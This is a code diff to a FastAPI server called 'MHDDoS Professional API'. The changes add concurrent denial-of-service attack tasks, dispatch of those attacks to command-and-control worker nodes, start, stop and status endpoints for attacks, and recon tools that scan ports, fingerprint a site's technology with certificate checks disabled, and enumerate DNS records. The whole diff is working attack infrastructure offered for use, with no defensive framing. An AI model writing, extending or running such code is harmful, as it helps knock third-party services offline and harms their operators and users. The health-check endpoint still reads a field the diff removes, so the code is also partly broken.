@@ -45,12 +45,14 @@ CONFIG_PATH = BASE_DIR / "config.json"
 
 # --- Global State ---
 class EngineState:
-    process: asyncio.subprocess.Process | None = None
+    active_tasks: dict[str, asyncio.subprocess.Process] = {}
+    task_info: dict[str, dict] = {}
     is_starting: bool = False
     connected_websockets: list[WebSocket] = []
+    max_concurrent: int = 5
 
 state = EngineState()
-app = FastAPI(title="MHDDoS Professional API", version="1.1.3")
+app = FastAPI(title="MHDDoS Professional API", version="1.1.5")
 
 # --- Command & Control (C2) State ---
 class C2State:
@@ -177,27 +179,27 @@ async def broadcast_log(message: str) -> None:
         if dead in state.connected_websockets:
             state.connected_websockets.remove(dead)
 
-async def run_attack_subprocess(params: AttackParams) -> None:
+async def run_attack_subprocess(task_id: str, params: AttackParams) -> None:
     """Runs the attack process and pipes output to WebSockets with throttling."""
     command = build_attack_command(params)
-    await broadcast_log(f"[*] LAUNCHING COMMAND: {' '.join(command)}")
+    await broadcast_log(json.dumps({"task_id": task_id, "type": "system", "msg": f"[*] LAUNCHING TASK {task_id}: {' '.join(command)}"}))
 
     try:
-        state.process = await asyncio.create_subprocess_exec(
+        process = await asyncio.create_subprocess_exec(
             *command,
             cwd=str(BASE_DIR),
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.STDOUT
         )
-        state.is_starting = False
-        await broadcast_log("[*] COMMAND DEPLOYED: Tactical engine initialized.")
+        state.active_tasks[task_id] = process
+        await broadcast_log(json.dumps({"task_id": task_id, "type": "system", "msg": f"[*] COMMAND DEPLOYED: Tactical engine initialized for {params.target}"}))
         
-        if state.process.stdout:
+        if process.stdout:
             last_broadcast = time.time()
             buffer = []
             
             while True:
-                line = await state.process.stdout.readline()
+                line = await process.stdout.readline()
                 if not line:
                     break
                 
@@ -209,22 +211,24 @@ async def run_attack_subprocess(params: AttackParams) -> None:
                 # Broadcast in batches or every 50ms to prevent WS flood
                 now = time.time()
                 if buffer and (now - last_broadcast > 0.05 or len(buffer) > 10):
-                    await broadcast_log("\n".join(buffer))
+                    await broadcast_log(json.dumps({"task_id": task_id, "type": "log", "msg": "\n".join(buffer)}))
                     buffer = []
                     last_broadcast = now
                     await asyncio.sleep(0.01) # Yield to other tasks
             
             if buffer:
-                await broadcast_log("\n".join(buffer))
+                await broadcast_log(json.dumps({"task_id": task_id, "type": "log", "msg": "\n".join(buffer)}))
                 
-        await state.process.wait()
-        await broadcast_log("[*] COMMAND TERMINATED: Engine process reached end-of-life.")
+        await process.wait()
+        await broadcast_log(json.dumps({"task_id": task_id, "type": "system", "msg": f"[*] COMMAND TERMINATED: Engine process reached end-of-life."}))
     except Exception as e:
-        logger.error(f"Engine Error: {e}")
-        await broadcast_log(f"[!] CRITICAL ENGINE ERROR: {e}")
+        logger.error(f"Engine Error in task {task_id}: {e}")
+        await broadcast_log(json.dumps({"task_id": task_id, "type": "error", "msg": f"[!] CRITICAL ENGINE ERROR: {e}"}))
     finally:
-        state.is_starting = False
-        state.process = None
+        if task_id in state.active_tasks:
+            del state.active_tasks[task_id]
+        if task_id in state.task_info:
+            del state.task_info[task_id]
 
 # --- Recon Engine ---
 class ReconManager:
@@ -333,6 +337,95 @@ class ReconManager:
                 
         return results
 
+    @staticmethod
+    async def scan_ports(target: str) -> list[dict[str, Any]]:
+        import socket
+        from urllib.parse import urlparse
+        
+        parsed = urlparse(target if "://" in target else f"http://{target}")
+        host = parsed.netloc or parsed.path
+        if host.startswith("www."):
+            host = host[4:]
+            
+        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 8080, 8443]
+        results = []
+        
+        for port in common_ports:
+            try:
+                loop = asyncio.get_event_loop()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
+                # Run connect in an executor to avoid blocking the event loop
+                result = await loop.run_in_executor(None, sock.connect_ex, (host, port))
+                if result == 0:
+                    results.append({"port": port, "status": "open"})
+                sock.close()
+            except Exception:
+                continue
+        return results
+
+    @staticmethod
+    def fingerprint_tech(target: str) -> dict[str, Any]:
+        import requests
+        import urllib3
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+        
+        url = target if target.startswith("http") else f"http://{target}"
+        try:
+            res = requests.get(url, timeout=5, verify=False, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TacticalRecon/1.0"})
+            headers = {k.lower(): v.lower() for k, v in res.headers.items()}
+            
+            tech_stack = []
+            
+            # Analyze Headers
+            server = headers.get("server", "")
+            if "nginx" in server: tech_stack.append("Nginx")
+            if "apache" in server: tech_stack.append("Apache")
+            if "cloudflare" in server: tech_stack.append("Cloudflare")
+            
+            x_powered_by = headers.get("x-powered-by", "")
+            if "php" in x_powered_by: tech_stack.append("PHP")
+            if "express" in x_powered_by: tech_stack.append("Express.js (Node.js)")
+            if "asp.net" in x_powered_by: tech_stack.append("ASP.NET")
+            
+            # Analyze Content
+            html = res.text.lower()
+            if "wp-content" in html or "wp-includes" in html: tech_stack.append("WordPress")
+            if "react" in html or 'data-reactroot' in html or 'id="root"' in html: tech_stack.append("React")
+            if "vue" in html or 'data-v-' in html: tech_stack.append("Vue.js")
+            if "next" in html or '_next/static' in html: tech_stack.append("Next.js")
+            if "nuxt" in html or '_nuxt' in html: tech_stack.append("Nuxt.js")
+            
+            return {
+                "status": "success",
+                "tech_stack": list(set(tech_stack)) if tech_stack else ["Unknown"]
+            }
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
+
+    @staticmethod
+    def enumerate_dns(target: str) -> dict[str, Any]:
+        import dns.resolver
+        from urllib.parse import urlparse
+        
+        parsed = urlparse(target if "://" in target else f"http://{target}")
+        domain = parsed.netloc or parsed.path
+        if domain.startswith("www."):
+            domain = domain[4:]
+            
+        records = {"A": [], "AAAA": [], "MX": [], "TXT": [], "NS": []}
+        
+        try:
+            for record_type in records.keys():
+                try:
+                    answers = dns.resolver.resolve(domain, record_type)
+                    records[record_type] = [rdata.to_text() for rdata in answers]
+                except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.Timeout):
+                    continue
+            return {"status": "success", "domain": domain, "records": records}
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
+
 # --- API Endpoints ---
 @app.get("/api/health", response_model=HealthResponse)
 async def health_check() -> HealthResponse:
@@ -340,7 +433,7 @@ async def health_check() -> HealthResponse:
         status="online",
         engine_active=state.process is not None,
         is_starting=state.is_starting,
-        version="1.1.3"
+        version="1.1.5"
     )
 
 # --- C2 Master Endpoints ---
@@ -418,6 +511,21 @@ async def recon_subdomains(params: AnalyzeParams):
     subs = await ReconManager.scan_subdomains(params.target)
     return {"status": "success", "subdomains": subs}
 
+@app.get("/api/tools/ports")
+async def tool_ports(host: str):
+    ports = await ReconManager.scan_ports(host)
+    return {"status": "success", "ports": ports}
+
+@app.get("/api/tools/tech")
+async def tool_tech(host: str):
+    tech = ReconManager.fingerprint_tech(host)
+    return tech
+
+@app.get("/api/tools/dns")
+async def tool_dns(host: str):
+    records = ReconManager.enumerate_dns(host)
+    return records
+
 @app.get("/api/recon/geo")
 async def recon_geo(target: str):
     import requests
@@ -442,51 +550,90 @@ async def recon_geo(target: str):
 
 @app.post("/api/attack/start", response_model=StatusResponse)
 async def start_attack(params: AttackParams) -> StatusResponse:
-    if state.process is not None or state.is_starting:
-        return StatusResponse(status="error", message="An attack sequence is already in progress.")
+    if len(state.active_tasks) >= state.max_concurrent:
+        return StatusResponse(status="error", message=f"Maximum concurrent tasks ({state.max_concurrent}) reached. Stop a task first.")
     
-    C2.active_task_id = str(uuid.uuid4())[:8]
+    task_id = str(uuid.uuid4())[:8]
+    
+    # Store initial info
+    state.task_info[task_id] = {
+        "target": params.target,
+        "method": params.method,
+        "threads": params.threads,
+        "duration": params.duration,
+        "start_time": time.time()
+    }
+    
     if params.distribute_to_workers:
-        params_dict = params.model_dump() if hasattr(params, 'model_dump') else params.dict()
+        params_dict = params.model_dump()
         for nid in list(C2.workers.keys()):
             C2.pending_tasks[nid].append({
                 "action": "attack",
-                "task_id": C2.active_task_id,
+                "task_id": task_id,
                 "params": params_dict
             })
-        asyncio.create_task(broadcast_log(f"[*] C2 MASTER: Dispatching task {C2.active_task_id} to {len(C2.workers)} workers."))
+        asyncio.create_task(broadcast_log(json.dumps({"task_id": task_id, "type": "system", "msg": f"[*] C2 MASTER: Dispatching task {task_id} to {len(C2.workers)} workers."})))
     
-    state.is_starting = True
-    asyncio.create_task(run_attack_subprocess(params))
-    return StatusResponse(status="success", message="Attack sequence initiated.")
+    asyncio.create_task(run_attack_subprocess(task_id, params))
+    return StatusResponse(status="success", message="Attack sequence initiated.", recommendation=task_id) # Using recommendation field temporarily as task_id return
+
+class StopParams(BaseModel):
+    task_id: str
 
 @app.post("/api/attack/stop", response_model=StatusResponse)
-async def stop_attack() -> StatusResponse:
+async def stop_attack(params: StopParams) -> StatusResponse:
+    task_id = params.task_id
+    
     # Broadcast stop to workers
     for nid in list(C2.workers.keys()):
-        C2.pending_tasks[nid].append({"action": "stop", "task_id": C2.active_task_id})
-    C2.active_task_id = None
+        C2.pending_tasks[nid].append({"action": "stop", "task_id": task_id})
 
-    if state.process is None:
-        return StatusResponse(status="error", message="No active engine process found locally (workers commanded to stop).")
+    if task_id not in state.active_tasks:
+        return StatusResponse(status="error", message=f"No active engine process found for task {task_id} locally.")
     
-    await broadcast_log("[*] INITIATING RECURSIVE TERMINATION: Cleaning up process tree...")
+    process = state.active_tasks[task_id]
+    await broadcast_log(json.dumps({"task_id": task_id, "type": "system", "msg": f"[*] INITIATING RECURSIVE TERMINATION FOR TASK {task_id}: Cleaning up process tree..."}))
     try:
-        pid = state.process.pid
+        pid = process.pid
         parent = psutil.Process(pid)
         for child in parent.children(recursive=True):
             child.kill()
         parent.kill()
-        return StatusResponse(status="success", message="All tactical processes terminated.")
+        
+        # Cleanup state immediately
+        del state.active_tasks[task_id]
+        if task_id in state.task_info:
+            del state.task_info[task_id]
+            
+        return StatusResponse(status="success", message=f"Task {task_id} terminated.")
     except psutil.NoSuchProcess:
-        state.process = None
+        if task_id in state.active_tasks:
+            del state.active_tasks[task_id]
+        if task_id in state.task_info:
+            del state.task_info[task_id]
         return StatusResponse(status="success", message="Process already purged.")
     except Exception as e:
-        await broadcast_log(f"[!] TERMINATION ERROR: {e}")
-        if state.process:
-            with contextlib.suppress(Exception):
-                state.process.kill()
+        await broadcast_log(json.dumps({"task_id": task_id, "type": "error", "msg": f"[!] TERMINATION ERROR: {e}"}))
+        with contextlib.suppress(Exception):
+            process.kill()
         return StatusResponse(status="error", message=str(e))
+
+@app.get("/api/attack/status")
+async def get_attack_status() -> dict[str, Any]:
+    tasks = []
+    now = time.time()
+    for task_id, info in state.task_info.items():
+        elapsed = int(now - info.get("start_time", now))
+        tasks.append({
+            "task_id": task_id,
+            "target": info.get("target"),
+            "method": info.get("method"),
+            "threads": info.get("threads"),
+            "duration": info.get("duration"),
+            "elapsed": elapsed,
+            "status": "running" if task_id in state.active_tasks else "unknown"
+        })
+    return {"status": "success", "active_tasks": tasks, "max_concurrent": state.max_concurrent}
 
 @app.get("/api/config/proxies")
 async def get_proxy_config() -> dict[str, Any]:
